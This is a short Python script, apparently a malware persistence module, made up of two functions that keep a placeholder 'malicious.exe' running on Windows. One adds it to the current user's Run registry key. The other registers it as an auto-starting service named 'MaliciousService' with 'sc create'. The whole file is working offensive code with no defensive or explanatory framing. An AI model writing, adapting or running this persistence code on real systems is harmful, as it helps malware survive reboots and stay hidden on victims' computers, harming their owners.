import subprocess
import platform

def create_registry_persistence():
    if platform.system() == "Windows":
        import winreg
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
            winreg.SetValueEx(key, 'PersistenceKey', 0, winreg.REG_SZ, "C:\\path\\to\\malicious.exe")
            winreg.CloseKey(key)
            print("Registry persistence established.")
        except Exception as e:
            print(f"Error creating registry persistence: {e}")
    else:
        print("Registry persistence is only applicable on Windows.")

def create_windows_service():
    if platform.system() == "Windows":
        try:
            subprocess.run("sc create MaliciousService binPath= C:\\path\\to\\malicious.exe start= auto", shell=True, check=True)
            print("Windows service persistence established.")
        except subprocess.CalledProcessError as e:
            print(f"Error creating Windows service: {e}")
    else:
        print("Windows service creation is only applicable on Windows.")
